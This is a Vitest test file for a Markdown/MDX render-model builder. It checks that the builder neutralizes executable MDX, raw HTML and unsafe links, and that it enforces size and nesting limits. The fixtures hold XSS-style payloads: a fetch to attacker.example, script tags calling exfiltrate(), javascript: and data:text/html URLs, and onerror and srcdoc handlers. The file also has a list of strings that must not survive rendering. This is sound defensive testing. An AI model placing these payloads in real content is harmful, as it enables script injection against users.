import { describe, expect, it, vi } from "vitest"
import {
  buildGenericRenderModel,
  GENERIC_SOURCE_PREFLIGHT_LIMITS,
  inspectGenericSourcePreflight,
} from "../generic-render-model"

describe("buildGenericRenderModel", () => {
  it("converts supported Markdown and GFM syntax into a serializable render model", () => {
    const source = `# Hello

Read **strong** and [the guide](https://example.com/docs) with ![an image](/images/cover.png) and \`inline code\`.

- First
- Second

1. Ordered

> A quoted paragraph.

\`\`\`ts
const answer = 42
\`\`\`

| Name | Value |
| --- | ---: |
| Safe | Yes |
`

    const model = buildGenericRenderModel(source)

    expect(model.blocks.map((block) => block.type)).toEqual([
      "heading",
      "paragraph",
      "list",
      "list",
      "blockquote",
      "code",
      "table",
    ])
    expect(model.blocks[0]).toEqual({
      type: "heading",
      depth: 1,
      text: "Hello",
      children: [{ type: "text", value: "Hello" }],
    })
    expect(model.blocks[1]).toEqual(
      expect.objectContaining({
        type: "paragraph",
        children: expect.arrayContaining([
          {
            type: "link",
            url: "https://example.com/docs",
            title: null,
            children: [{ type: "text", value: "the guide" }],
          },
          { type: "image", url: "/images/cover.png", title: null, alt: "an image" },
          { type: "inline-code", value: "inline code" },
        ]),
      }),
    )
    expect(model.blocks[5]).toEqual({ type: "code", language: "ts", meta: null, value: "const answer = 42" })
    expect(model.blocks[6]).toEqual(
      expect.objectContaining({
        type: "table",
        align: [null, "right"],
      }),
    )
    expect(JSON.parse(JSON.stringify(model))).toEqual(model)
  })

  it("does not allow callers to replace the RepoPress-owned parser at runtime", () => {
    const injectedParser = { parse: vi.fn(() => ({ type: "root", children: [] })) }
    const callWithExtraRuntimeArgument = buildGenericRenderModel as unknown as (
      source: string,
      parser: typeof injectedParser,
    ) => ReturnType<typeof buildGenericRenderModel>

    const model = callWithExtraRuntimeArgument("# Owned parser", injectedParser)

    expect(injectedParser.parse).not.toHaveBeenCalled()
    expect(model.blocks).toContainEqual(expect.objectContaining({ type: "heading", text: "Owned parser" }))
  })

  it("turns JSX into inert placeholders and discards executable MDX source", () => {
    const source = `import Secret from "./secret"
export const token = readToken()

# Hello

<Chart data={loadSecret()} onClick={() => steal()} />

{fetch("https://attacker.example")}

<div onclick="steal()"><script>exfiltrate()</script></div>
`

    const model = buildGenericRenderModel(source)
    const serialized = JSON.stringify(model)

    expect(model.blocks).toContainEqual(expect.objectContaining({ type: "component-placeholder", name: "Chart" }))
    expect(model.blocks).toContainEqual(expect.objectContaining({ type: "component-placeholder", name: "div" }))
    for (const executableSource of [
      "./secret",
      "readToken",
      "loadSecret",
      "onClick",
      "steal",
      "fetch",
      "attacker.example",
      "onclick",
      "script",
      "exfiltrate",
    ]) {
      expect(serialized).not.toContain(executableSource)
    }
  })

  it("drops unsafe URL targets without dropping their readable labels", () => {
    const model = buildGenericRenderModel(
      `[safe](../guide) [anchor](#intro) [mail](mailto:hello@example.com) [bad](javascript:alert(1)) ![bad image](data:text/html;base64,PHNjcmlwdD4=)`,
    )
    const serialized = JSON.stringify(model)

    expect(serialized).toContain("../guide")
    expect(serialized).toContain("#intro")
    expect(serialized).toContain("mailto:hello@example.com")
    expect(serialized).toContain('"value":"bad"')
    expect(serialized).not.toContain("javascript:")
    expect(serialized).not.toContain("data:text/html")
  })

  it("resolves safe reference-style links and images", () => {
    const model = buildGenericRenderModel(`Read [the guide][guide] and view ![the cover][cover].

[guide]: /docs/guide "Guide"
[cover]: https://example.com/cover.png "Cover"`)
    const serialized = JSON.stringify(model)

    expect(serialized).toContain('"type":"link","url":"/docs/guide","title":"Guide"')
    expect(serialized).toContain(
      '"type":"image","url":"https://example.com/cover.png","title":"Cover","alt":"the cover"',
    )
  })

  it("treats raw HTML as inert component placeholders", () => {
    const model = buildGenericRenderModel(
      `<img src="x" onerror="steal()"><iframe srcdoc="<script>bad()</script>"></iframe>`,
    )
    const serialized = JSON.stringify(model)

    expect(model.blocks).toContainEqual({ type: "component-placeholder", name: "img" })
    expect(model.blocks).toContainEqual({ type: "component-placeholder", name: "iframe" })
    expect(serialized).not.toContain("onerror")
    expect(serialized).not.toContain("srcdoc")
    expect(serialized).not.toContain("steal")
    expect(serialized).not.toContain("bad()")
  })

  it("fails closed when malformed MDX is mixed with executable source", () => {
    const model = buildGenericRenderModel(`import Secret from "./secret"

# Still readable

<Broken value={steal()}>`)
    const serialized = JSON.stringify(model)

    expect(serialized).not.toContain("./secret")
    expect(serialized).not.toContain("steal")
    expect(serialized).not.toContain("Still readable")
    expect(model.blocks).toContainEqual({ type: "component-placeholder", name: "Broken" })
  })

  it("rejects oversized UTF-8 source without leaking it", () => {
    const secret = "oversized-secret"
    const model = buildGenericRenderModel(`${secret}${"界".repeat(175_000)}`)

    expect(model).toEqual({
      blocks: [
        {
          type: "diagnostic",
          code: "SOURCE_BYTE_LIMIT",
          message: "Generic preview is unavailable because this document exceeds the safe source-size limit.",
        },
      ],
    })
    expect(JSON.stringify(model)).not.toContain(secret)
  })

  it("rejects deeply nested syntax before recursive conversion", () => {
    const secret = "deep-secret"
    const model = buildGenericRenderModel(
      `${Array.from({ length: 80 }, () => "<Box>").join("\n")}\n${secret}\n${Array.from({ length: 80 }, () => "</Box>").join("\n")}`,
    )

    expect(model.blocks).toEqual([
      {
        type: "diagnostic",
        code: "SYNTAX_DEPTH_LIMIT",
        message: "Generic preview is unavailable because this document is nested too deeply.",
      },
    ])
    expect(JSON.stringify(model)).not.toContain(secret)
  })

  it("rejects syntax-node exhaustion deterministically", () => {
    const source = Array.from({ length: 5_100 }, (_, index) => `# heading-${index}`).join("\n")

    const first = buildGenericRenderModel(source)
    const second = buildGenericRenderModel(source)

    expect(first).toEqual(second)
    expect(first.blocks).toEqual([
      {
        type: "diagnostic",
        code: "SYNTAX_NODE_LIMIT",
        message: "Generic preview is unavailable because this document has too many syntax nodes.",
      },
    ])
    expect(JSON.parse(JSON.stringify(first))).toEqual(first)
  })

  it("rejects output-text exhaustion without returning partial content", () => {
    const secret = "output-secret"
    const model = buildGenericRenderModel(
      `\`\`\`txt\n${secret}${"x".repeat(55_000)}\n${Array.from({ length: 4 }, () => "x".repeat(55_000)).join("\n")}\n\`\`\``,
    )

    expect(model.blocks).toEqual([
      {
        type: "diagnostic",
        code: "OUTPUT_BYTE_LIMIT",
        message: "Generic preview is unavailable because the safe render output limit was exceeded.",
      },
    ])
    expect(JSON.stringify(model)).not.toContain(secret)
  })

  it("applies output-node limits to malformed-MDX placeholder recovery", () => {
    const source = Array.from({ length: 5_100 }, (_, index) => `<Broken${index} value={>`).join("\n")

    const model = buildGenericRenderModel(source)

    expect(model.blocks).toEqual([
      {
        type: "diagnostic",
        code: "OUTPUT_NODE_LIMIT",
        message: "Generic preview is unavailable because the safe render node limit was exceeded.",
      },
    ])
  })

  it.each([
    {
      name: "blockquote marker flood",
      source: "> ".repeat(100_000),
      code: "SOURCE_CONTAINER_DEPTH_LIMIT",
    },
    {
      name: "list marker flood",
      source: "- ".repeat(100_000),
      code: "SOURCE_CONTAINER_DEPTH_LIMIT",
    },
    {
      name: "pathological list indentation",
      source: `${" ".repeat(300)}- item`,
      code: "SOURCE_CONTAINER_INDENT_LIMIT",
    },
    {
      name: "pathological line count",
      source: "x\n".repeat(20_001),
      code: "SOURCE_LINE_COUNT_LIMIT",
    },
    {
      name: "pathological CR line count",
      source: "x\r".repeat(20_001),
      code: "SOURCE_LINE_COUNT_LIMIT",
    },
    {
      name: "pathological line length",
      source: "x".repeat(70_000),
      code: "SOURCE_LINE_LIMIT",
    },
  ])("rejects $name in source preflight", ({ source, code }) => {
    expect(inspectGenericSourcePreflight(source)).toBe(code)
    const model = buildGenericRenderModel(source)

    expect(model.blocks).toEqual([
      expect.objectContaining({
        type: "diagnostic",
        code,
      }),
    ])
    expect(JSON.stringify(model)).not.toContain(source.slice(0, 80))
  })

  it("allows legitimate long prose, fenced code, and moderate container nesting", () => {
    const longProse = "a".repeat(60_000)
    const longCode = `\`\`\`txt\n${"b".repeat(60_000)}\n\`\`\``
    const codeWithFenceLikeContent = `\`\`\`txt\n\`\`\`not-a-close\n${"> ".repeat(100)}\n\`\`\``
    const moderateContainers = `${"> ".repeat(20)}Readable\n${"  ".repeat(20)}- nested item`

    expect(inspectGenericSourcePreflight(longProse)).toBeNull()
    expect(inspectGenericSourcePreflight(longCode)).toBeNull()
    expect(inspectGenericSourcePreflight(codeWithFenceLikeContent)).toBeNull()
    expect(inspectGenericSourcePreflight(moderateContainers)).toBeNull()
    expect(GENERIC_SOURCE_PREFLIGHT_LIMITS.lineBytes).toBeGreaterThan(60_000)
  })

  it.each([
    "\n",
    "\r",
    "\r\n",
  ])("does not let invalid backtick fence info hide container floods with %j line endings", (lineEnding) => {
    const flood = Array.from({ length: 1_500 }, () => "> ".repeat(65)).join(lineEnding)
    const source = `\`\`\`foo\`\`\`${lineEnding}${flood}`

    expect(inspectGenericSourcePreflight(source)).toBe("SOURCE_CONTAINER_DEPTH_LIMIT")
    expect(buildGenericRenderModel(source).blocks).toEqual([
      expect.objectContaining({ type: "diagnostic", code: "SOURCE_CONTAINER_DEPTH_LIMIT" }),
    ])
  })

  it("keeps valid backtick and tilde fences out of container-prefix scanning", () => {
    const markerLikeCode = "> ".repeat(100)
    const validBacktickFence = `\`\`\`txt\n${markerLikeCode}\n\`\`\``
    const validTildeFence = `~~~info-with-\`backticks\`\n${markerLikeCode}\n~~~`

    expect(inspectGenericSourcePreflight(validBacktickFence)).toBeNull()
    expect(inspectGenericSourcePreflight(validTildeFence)).toBeNull()
  })
})
